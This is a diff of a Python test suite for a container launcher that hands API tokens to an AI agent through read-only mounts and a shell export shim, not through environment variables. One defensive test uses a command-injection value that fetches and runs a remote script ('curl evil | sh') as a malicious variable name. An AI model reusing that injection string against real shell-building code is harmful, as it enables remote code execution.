@@ -1394,47 +1394,93 @@ class TestAgentConfigIntegration:
             env = m.runtime.run.call_args.kwargs.get("env") or {}
             assert env.get("MY_VAR") == "hello"
 
-    def test_env_file_token_delivered_to_container_env(self, start_mocks, tmp_path):
-        """Block C: the active agent's env_file pointer → the container env VALUE
-        is the file's CONTENTS (secret read at the env-emission seam, per-node)."""
+    def test_secret_path_delivered_arms_length_mount_and_shim(
+        self, start_mocks, tmp_path,
+    ):
+        """SECRET category (secret_path): the active agent's pointer → a ro MOUNT to
+        /run/kanibako/secrets/<VAR> + an in-box export shim. The VALUE is NEVER read
+        into the container env nor onto the podman argv (only the mount PATH is)."""
+        from kanibako.settings_categories import SECRET_MOUNT_DIR
+
         tok = tmp_path / "token"
         tok.write_text("sk-persona-bearer\n")
         with start_mocks() as m:
-            m.agent_cfg.env_file = {"ANTHROPIC_AUTH_TOKEN": str(tok)}
+            m.agent_cfg.secret_path = {"ANTHROPIC_AUTH_TOKEN": str(tok)}
             m.load_agent_config.return_value = m.agent_cfg
             _run_container(
                 project_dir=None, entrypoint=None, image_override=None,
                 new_session=False, safe_mode=False, resume_mode=False,
                 extra_args=[],
             )
-            env = m.runtime.run.call_args.kwargs.get("env") or {}
-            assert env.get("ANTHROPIC_AUTH_TOKEN") == "sk-persona-bearer"
+            kw = m.runtime.run.call_args.kwargs
+            # The secret VALUE is NOT in the container env (arm's-length).
+            env = kw.get("env") or {}
+            assert "ANTHROPIC_AUTH_TOKEN" not in env
+            assert "sk-persona-bearer" not in "".join(str(v) for v in env.values())
+            # A ro mount of the host PATH to SECRET_MOUNT_DIR/<VAR> (only the PATH).
+            mounts = kw.get("extra_mounts") or []
+            secret_mounts = [
+                mt for mt in mounts
+                if getattr(mt, "destination", None)
+                == f"{SECRET_MOUNT_DIR}/ANTHROPIC_AUTH_TOKEN"
+            ]
+            assert len(secret_mounts) == 1
+            assert str(secret_mounts[0].source) == str(tok)
+            assert secret_mounts[0].options == "ro"
+            # The entrypoint is swapped to the sh -c export shim; the cli_args carry
+            # the export STATEMENT referencing the MOUNT PATH — never the token value.
+            assert kw.get("entrypoint") == "sh" or "sh" in str(kw.get("entrypoint"))
+            argv = " ".join(kw.get("cli_args") or [])
+            assert f"{SECRET_MOUNT_DIR}/ANTHROPIC_AUTH_TOKEN" in argv
+            assert "ANTHROPIC_AUTH_TOKEN" in argv
+            assert "sk-persona-bearer" not in argv
 
-    def test_env_file_missing_does_not_crash_launch(self, start_mocks, tmp_path):
-        """A missing token file fails soft: the var is unset, launch proceeds."""
+    def test_secret_path_missing_does_not_crash_launch(self, start_mocks, tmp_path):
+        """A missing token file fails soft: no mount, no shim, launch proceeds."""
+        from kanibako.settings_categories import SECRET_MOUNT_DIR
+
         with start_mocks() as m:
-            m.agent_cfg.env_file = {"ANTHROPIC_AUTH_TOKEN": str(tmp_path / "absent")}
+            m.agent_cfg.secret_path = {
+                "ANTHROPIC_AUTH_TOKEN": str(tmp_path / "absent")
+            }
             m.load_agent_config.return_value = m.agent_cfg
             _run_container(
                 project_dir=None, entrypoint=None, image_override=None,
                 new_session=False, safe_mode=False, resume_mode=False,
                 extra_args=[],
             )
-            # Launch still happened; the var is simply absent.
-            env = m.runtime.run.call_args.kwargs.get("env") or {}
+            kw = m.runtime.run.call_args.kwargs
+            env = kw.get("env") or {}
             assert "ANTHROPIC_AUTH_TOKEN" not in env
+            mounts = kw.get("extra_mounts") or []
+            assert not any(
+                getattr(mt, "destination", "").startswith(SECRET_MOUNT_DIR)
+                for mt in mounts
+            )
+            # Fail-soft: no secret winner → no shim → bare entrypoint (not sh -c).
+            assert kw.get("entrypoint") != "sh"
 
-    def test_no_env_file_is_byte_identical(self, start_mocks):
-        """Backward-compat: no env_file set → the container env is unaffected."""
+    def test_no_secret_path_is_byte_identical(self, start_mocks):
+        """A box with NO secrets: no mount, no shim, bare entrypoint (zero delta)."""
+        from kanibako.settings_categories import SECRET_MOUNT_DIR
+
         with start_mocks() as m:
-            # default AgentConfig().env_file == {}
+            # default AgentConfig().secret_path == {}
             _run_container(
                 project_dir=None, entrypoint=None, image_override=None,
                 new_session=False, safe_mode=False, resume_mode=False,
                 extra_args=[],
             )
-            env = m.runtime.run.call_args.kwargs.get("env") or {}
+            kw = m.runtime.run.call_args.kwargs
+            env = kw.get("env") or {}
             assert "ANTHROPIC_AUTH_TOKEN" not in env
+            mounts = kw.get("extra_mounts") or []
+            assert not any(
+                getattr(mt, "destination", "").startswith(SECRET_MOUNT_DIR)
+                for mt in mounts
+            )
+            # No secret → NO shim: the entrypoint is the bare agent (never sh -c).
+            assert kw.get("entrypoint") != "sh"
 
     def test_state_env_merged_into_container_env(self, start_mocks):
         """Descriptor container_env is merged into the container env.
@@ -3464,82 +3510,115 @@ class TestSeedNewBoxCreateEntry:
         assert kwargs["suppress_oauth"] is False
 
 
-class TestResolveEnvFiles:
-    """Block C: env-from-file token delivery (secret hygiene + fail-soft)."""
+class TestEmitSecretMounts:
+    """SECRET category (secret_path): arm's-length ro-mount emission + fail-soft.
+
+    ``_emit_secret_mounts`` STATs each pointer (never reads the value) and emits a ro
+    Mount to SECRET_MOUNT_DIR/<VAR> + the export VAR list. Missing/unreadable/empty
+    ⇒ WARN + VAR dropped (no crash, no export).
+    """
 
     def _logger(self):
         import logging
-        return logging.getLogger("test_resolve_env_files")
+        return logging.getLogger("test_emit_secret_mounts")
 
-    def _call(self, env_file):
-        from kanibako.commands.start import _resolve_env_files
-        return _resolve_env_files(env_file, self._logger())
+    def _reconciled(self, pointers):
+        # Build a reconciled-like object whose .mounts carries secret_path entries
+        # exactly as reconcile_categories would (delivery=MOUNT, box_dest fixed).
+        from types import SimpleNamespace
+        from kanibako.settings_categories import (
+            SECRET_MOUNT_DIR,
+            CategoryEntry,
+        )
+        mounts = [
+            CategoryEntry(
+                category="secret_path", scope="agent",
+                box_dest=f"{SECRET_MOUNT_DIR}/{var}", host_src=path,
+                delivery="MOUNT", options="ro", name=var,
+            )
+            for var, path in pointers.items()
+        ]
+        return SimpleNamespace(mounts=mounts)
 
-    def test_reads_file_into_var(self, tmp_path):
+    def _call(self, pointers):
+        from kanibako.commands.start import _emit_secret_mounts
+        return _emit_secret_mounts(self._reconciled(pointers), self._logger())
+
+    def test_present_file_mounts_ro_path_only(self, tmp_path):
+        from kanibako.settings_categories import SECRET_MOUNT_DIR
         tok = tmp_path / "token"
         tok.write_text("sk-secret-123\n")
-        out = self._call({"ANTHROPIC_AUTH_TOKEN": str(tok)})
-        # One trailing newline stripped.
-        assert out == {"ANTHROPIC_AUTH_TOKEN": "sk-secret-123"}
-
-    def test_no_trailing_newline_kept_whole(self, tmp_path):
-        tok = tmp_path / "token"
-        tok.write_text("sk-secret-123")  # no trailing newline
-        out = self._call({"ANTHROPIC_AUTH_TOKEN": str(tok)})
-        assert out == {"ANTHROPIC_AUTH_TOKEN": "sk-secret-123"}
-
-    def test_only_one_trailing_newline_stripped(self, tmp_path):
-        tok = tmp_path / "token"
-        tok.write_text("sk-secret-123\n\n")  # two trailing newlines
-        out = self._call({"ANTHROPIC_AUTH_TOKEN": str(tok)})
-        # Exactly ONE newline removed (a token ending in whitespace not mangled).
-        assert out == {"ANTHROPIC_AUTH_TOKEN": "sk-secret-123\n"}
+        mounts, exports = self._call({"ANTHROPIC_AUTH_TOKEN": str(tok)})
+        assert exports == ["ANTHROPIC_AUTH_TOKEN"]
+        assert len(mounts) == 1
+        assert str(mounts[0].source) == str(tok)
+        assert mounts[0].destination == f"{SECRET_MOUNT_DIR}/ANTHROPIC_AUTH_TOKEN"
+        assert mounts[0].options == "ro"  # NO :U
 
     def test_empty_map_is_empty(self):
-        assert self._call({}) == {}
+        assert self._call({}) == ([], [])
 
-    def test_missing_file_var_unset_no_crash(self, tmp_path, caplog):
+    def test_invalid_var_name_skipped_and_warned(self, tmp_path, caplog):
+        # DEFENSE-IN-DEPTH (F1): the VAR is interpolated into the generated `sh -c`
+        # export shim, so a VAR that bypassed `config set` validation (a hand-edited
+        # YAML / a broader settable surface) MUST be rejected fail-soft here — never
+        # reaching the shell. A valid VAR alongside it still delivers (per-VAR skip).
+        import logging
+        from kanibako.settings_categories import SECRET_MOUNT_DIR
+        good = tmp_path / "token"
+        good.write_text("sk-secret\n")
+        evil = tmp_path / "evil"
+        evil.write_text("x\n")
+        with caplog.at_level(logging.WARNING):
+            mounts, exports = self._call({
+                "GOOD_TOKEN": str(good),
+                "X; curl evil | sh; echo ": str(evil),
+            })
+        assert exports == ["GOOD_TOKEN"]  # malicious VAR dropped, valid one kept
+        assert [m.destination for m in mounts] == [
+            f"{SECRET_MOUNT_DIR}/GOOD_TOKEN"
+        ]
+        assert not any("curl evil" in str(m.destination) for m in mounts)
+        assert any("invalid VAR name" in r.getMessage() for r in caplog.records)
+
+    def test_missing_file_var_dropped_no_crash(self, tmp_path, caplog):
         import logging
         missing = tmp_path / "nope" / "token"
         with caplog.at_level(logging.WARNING):
-            out = self._call({"ANTHROPIC_AUTH_TOKEN": str(missing)})
-        # Fail-soft: var UNSET, no exception raised.
-        assert out == {}
-        # WARN loudly, referencing the VAR + path.
+            mounts, exports = self._call({"ANTHROPIC_AUTH_TOKEN": str(missing)})
+        assert (mounts, exports) == ([], [])  # fail-soft
         assert any("not found" in r.getMessage() for r in caplog.records)
         assert any("ANTHROPIC_AUTH_TOKEN" in r.getMessage() for r in caplog.records)
 
-    def test_missing_file_warning_is_nonvacuous(self, tmp_path, caplog):
-        # Mutation-check: a PRESENT file must NOT emit the not-found warning
-        # (proves the warning is gated on the real failure, not always emitted).
+    def test_present_file_no_warning(self, tmp_path, caplog):
+        # Mutation-check: a PRESENT file must NOT emit the not-found warning.
         import logging
         tok = tmp_path / "token"
         tok.write_text("v\n")
         with caplog.at_level(logging.WARNING):
-            out = self._call({"ANTHROPIC_AUTH_TOKEN": str(tok)})
-        assert out == {"ANTHROPIC_AUTH_TOKEN": "v"}
+            mounts, exports = self._call({"ANTHROPIC_AUTH_TOKEN": str(tok)})
+        assert exports == ["ANTHROPIC_AUTH_TOKEN"]
         assert not any("not found" in r.getMessage() for r in caplog.records)
 
-    def test_empty_file_var_unset_warns(self, tmp_path, caplog):
+    def test_empty_file_var_dropped_warns(self, tmp_path, caplog):
         import logging
         tok = tmp_path / "token"
-        tok.write_text("")  # empty
+        tok.write_text("")  # empty (st_size == 0) — stat-detected, never read
         with caplog.at_level(logging.WARNING):
-            out = self._call({"ANTHROPIC_AUTH_TOKEN": str(tok)})
-        assert out == {}
+            mounts, exports = self._call({"ANTHROPIC_AUTH_TOKEN": str(tok)})
+        assert (mounts, exports) == ([], [])
         assert any("empty" in r.getMessage() for r in caplog.records)
 
-    def test_newline_only_file_is_empty(self, tmp_path, caplog):
-        # A file containing only a trailing newline strips to "" -> unset.
+    def test_directory_pointer_dropped(self, tmp_path, caplog):
         import logging
-        tok = tmp_path / "token"
-        tok.write_text("\n")
+        d = tmp_path / "adir"
+        d.mkdir()
         with caplog.at_level(logging.WARNING):
-            out = self._call({"ANTHROPIC_AUTH_TOKEN": str(tok)})
-        assert out == {}
-        assert any("empty" in r.getMessage() for r in caplog.records)
+            mounts, exports = self._call({"ANTHROPIC_AUTH_TOKEN": str(d)})
+        assert (mounts, exports) == ([], [])
+        assert any("not a regular file" in r.getMessage() for r in caplog.records)
 
-    def test_unreadable_file_var_unset_no_crash(self, tmp_path, caplog):
+    def test_unreadable_file_var_dropped_no_crash(self, tmp_path, caplog):
         import logging
         import os
         tok = tmp_path / "token"
@@ -3547,54 +3626,76 @@ class TestResolveEnvFiles:
         os.chmod(tok, 0o000)
         try:
             with caplog.at_level(logging.WARNING):
-                out = self._call({"ANTHROPIC_AUTH_TOKEN": str(tok)})
+                mounts, exports = self._call({"ANTHROPIC_AUTH_TOKEN": str(tok)})
         finally:
-            os.chmod(tok, 0o600)  # restore so tmp cleanup works
-        # Root runs as uid 0 and can read 0o000 files; skip the assert then.
+            os.chmod(tok, 0o600)
         if os.geteuid() != 0:
-            assert out == {}
-            assert any("cannot read" in r.getMessage() for r in caplog.records)
+            assert (mounts, exports) == ([], [])
+            assert any("unreadable" in r.getMessage() for r in caplog.records)
 
     def test_tilde_expansion(self, tmp_path, monkeypatch):
-        # ~ expands against HOME.
         home = tmp_path / "home"
         (home / ".config").mkdir(parents=True)
         (home / ".config" / "token").write_text("tok-tilde\n")
         monkeypatch.setenv("HOME", str(home))
-        out = self._call({"ANTHROPIC_AUTH_TOKEN": "~/.config/token"})
-        assert out == {"ANTHROPIC_AUTH_TOKEN": "tok-tilde"}
+        mounts, exports = self._call({"ANTHROPIC_AUTH_TOKEN": "~/.config/token"})
+        assert exports == ["ANTHROPIC_AUTH_TOKEN"]
+        assert str(mounts[0].source) == str(home / ".config" / "token")
 
     def test_env_var_expansion(self, tmp_path, monkeypatch):
-        # $VAR in the path expands.
         d = tmp_path / "secrets"
         d.mkdir()
         (d / "token").write_text("tok-envvar\n")
         monkeypatch.setenv("SECRETS_DIR", str(d))
-        out = self._call({"ANTHROPIC_AUTH_TOKEN": "$SECRETS_DIR/token"})
-        assert out == {"ANTHROPIC_AUTH_TOKEN": "tok-envvar"}
+        mounts, exports = self._call({"ANTHROPIC_AUTH_TOKEN": "$SECRETS_DIR/token"})
+        assert str(mounts[0].source) == str(d / "token")
 
-    def test_token_value_never_logged(self, tmp_path, caplog):
-        # LOAD-BEARING: the secret value must NOT appear in any log record, on
-        # either the success path or (by construction) the warn paths.
+    def test_secret_value_never_read_or_logged(self, tmp_path, caplog):
+        # LOAD-BEARING (arm's-length): the value must not appear in any log record,
+        # AND the mount carries only the PATH (never the contents).
         import logging
         secret = "sk-super-secret-do-not-log-XYZ"
         tok = tmp_path / "token"
         tok.write_text(secret + "\n")
         with caplog.at_level(logging.DEBUG):
-            out = self._call({"ANTHROPIC_AUTH_TOKEN": str(tok)})
-        assert out == {"ANTHROPIC_AUTH_TOKEN": secret}
+            mounts, exports = self._call({"ANTHROPIC_AUTH_TOKEN": str(tok)})
+        assert str(mounts[0].source) == str(tok)  # PATH only
         for r in caplog.records:
             assert secret not in r.getMessage()
 
     def test_per_var_isolation_missing_does_not_block_present(self, tmp_path):
-        # Multiple entries: a missing one is skipped, a present one still delivered.
         good = tmp_path / "good"
         good.write_text("good-tok\n")
-        out = self._call({
+        mounts, exports = self._call({
             "GOOD": str(good),
             "MISSING": str(tmp_path / "absent"),
         })
-        assert out == {"GOOD": "good-tok"}
+        assert exports == ["GOOD"]
+        assert len(mounts) == 1
+
+
+class TestSecretExportShim:
+    """The box-side export shim (``_secret_export_shim``) — arm's-length wiring."""
+
+    def test_shim_wraps_agent_with_exec(self):
+        from kanibako.commands.start import _secret_export_shim
+        from kanibako.settings_categories import SECRET_MOUNT_DIR
+        ep, args = _secret_export_shim("claude", ["--flag"], ["ANTHROPIC_AUTH_TOKEN"])
+        assert ep == "sh"
+        assert args[0] == "-c"
+        script = args[1]
+        # exports from the MOUNT path, never a literal secret; then exec the agent.
+        assert f"{SECRET_MOUNT_DIR}/ANTHROPIC_AUTH_TOKEN" in script
+        assert "export ANTHROPIC_AUTH_TOKEN=" in script
+        assert 'exec "$@"' in script
+        # $0=sh, $@=claude --flag (exec runs the agent with its args intact).
+        assert args[2:] == ["sh", "claude", "--flag"]
+
+    def test_multiple_vars_each_exported(self):
+        from kanibako.commands.start import _secret_export_shim
+        _ep, args = _secret_export_shim("claude", [], ["A_TOK", "B_TOK"])
+        script = args[1]
+        assert "export A_TOK=" in script and "export B_TOK=" in script
 
 
 # ===========================================================================
@@ -3707,7 +3808,7 @@ class TestPreflightPersonaLoad:
         cfg = self._cfg()
         tok = tmp_path / "tok"
         tok.write_text("sk-key\n")
-        cfg.env_file = {"ANTHROPIC_AUTH_TOKEN": str(tok)}
+        cfg.secret_path = {"ANTHROPIC_AUTH_TOKEN": str(tok)}
         endpoint, err, adopted = _preflight_persona_load(
             "navigator℘claude", cfg, "https://key.example", self._logger(),
         )
@@ -3729,9 +3830,9 @@ class TestPreflightPersonaLoad:
         assert endpoint == "https://b3.example"
         assert adopted is True
         # B3 mutates the in-memory config: endpoint (→ suppress + BASE_URL) and
-        # the bearer token pointer (→ env_file) are populated.
+        # the bearer token pointer (→ secret_path) are populated.
         assert cfg.state["endpoint"] == "https://b3.example"
-        assert cfg.env_file["ANTHROPIC_AUTH_TOKEN"].endswith(
+        assert cfg.secret_path["ANTHROPIC_AUTH_TOKEN"].endswith(
             "/claude/navigator/token"
         )
         # The resolved endpoint is the suppress signal: non-None ⇒ suppress fires.
@@ -3766,18 +3867,18 @@ class TestPreflightPersonaLoad:
         self, tmp_path, monkeypatch,
     ):
         # F4: a KEYSPACE-recognised persona (endpoint from the keyspace) whose
-        # env_file carries no token FALLS BACK to the host-dir token file.
+        # secret_path carries no token FALLS BACK to the host-dir token file.
         from kanibako.commands.start import _preflight_persona_load
 
         self._host(tmp_path, monkeypatch, base_url="https://ignored", token="sk-host\n")
-        cfg = self._cfg()  # empty env_file → the fallback must supply the token.
+        cfg = self._cfg()  # empty secret_path → the fallback must supply the token.
         endpoint, err, adopted = _preflight_persona_load(
             "navigator℘claude", cfg, "https://key.example", self._logger(),
         )
         assert err is None
         assert endpoint == "https://key.example"  # keyspace endpoint wins.
-        # The host-dir token pointer is adopted into env_file → caller persists.
-        assert cfg.env_file["ANTHROPIC_AUTH_TOKEN"].endswith(
+        # The host-dir token pointer is adopted into secret_path → caller persists.
+        assert cfg.secret_path["ANTHROPIC_AUTH_TOKEN"].endswith(
             "/claude/navigator/token"
         )
         assert adopted is True
@@ -3785,7 +3886,7 @@ class TestPreflightPersonaLoad:
     def test_keyspace_endpoint_no_token_anywhere_errors(
         self, tmp_path, monkeypatch,
     ):
-        # F4: keyspace endpoint, NO env_file token, NO host token → hard error.
+        # F4: keyspace endpoint, NO secret_path token, NO host token → hard error.
         from kanibako.commands.start import _preflight_persona_load
 
         monkeypatch.setenv("XDG_CONFIG_HOME", str(tmp_path))  # no host dir/token.
@@ -3799,7 +3900,7 @@ class TestPreflightPersonaLoad:
     def test_token_gate_requires_the_token_var_specifically(
         self, tmp_path, monkeypatch,
     ):
-        # N1: some OTHER env_file var resolving does NOT satisfy the token gate —
+        # N1: some OTHER secret_path var resolving does NOT satisfy the token gate —
         # only a resolvable ANTHROPIC_AUTH_TOKEN counts.
         from kanibako.commands.start import _preflight_persona_load
 
@@ -3807,7 +3908,7 @@ class TestPreflightPersonaLoad:
         other = tmp_path / "other"
         other.write_text("value\n")
         cfg = self._cfg()
-        cfg.env_file = {"SOME_OTHER_VAR": str(other)}
+        cfg.secret_path = {"SOME_OTHER_VAR": str(other)}
         endpoint, err, adopted = _preflight_persona_load(
             "navigator℘claude", cfg, "https://key.example", self._logger(),
         )
@@ -4023,12 +4124,26 @@ class TestPersonaLoadOrErrorIntegration:
                     extra_args=[],
                 )
             assert rc == 0
-            env = m.runtime.run.call_args.kwargs.get("env") or {}
-            # endpoint (BASE_URL, descriptor channel), token (env_file), and the
-            # model-map (agent env channel) all reach the container.
+            from kanibako.settings_categories import SECRET_MOUNT_DIR
+            kw = m.runtime.run.call_args.kwargs
+            env = kw.get("env") or {}
+            # endpoint (BASE_URL, descriptor channel) and the model-map (agent env
+            # channel) reach the container ENV; the token is delivered ARM'S-LENGTH.
             assert env.get("ANTHROPIC_BASE_URL") == "https://b3.example"
-            assert env.get("ANTHROPIC_AUTH_TOKEN") == "sk-b3-bearer"
             assert env.get("ANTHROPIC_DEFAULT_OPUS_MODEL") == "gemma-big"
+            # The bearer token is delivered via the SECRET category: a ro MOUNT +
+            # in-box export shim — its VALUE is NEVER in the container env nor argv.
+            assert "ANTHROPIC_AUTH_TOKEN" not in env
+            assert "sk-b3-bearer" not in "".join(str(v) for v in env.values())
+            mounts = kw.get("extra_mounts") or []
+            assert any(
+                getattr(mt, "destination", "")
+                == f"{SECRET_MOUNT_DIR}/ANTHROPIC_AUTH_TOKEN"
+                and getattr(mt, "options", "") == "ro"
+                for mt in mounts
+            )
+            assert kw.get("entrypoint") == "sh"  # the export shim wraps the agent
+            assert "sk-b3-bearer" not in " ".join(kw.get("cli_args") or [])
             # THE LEAK GUARD: a B3-adopted persona suppresses the OAuth cred sync.
             m_credsync.refresh_box_credentials.assert_called()
             assert (
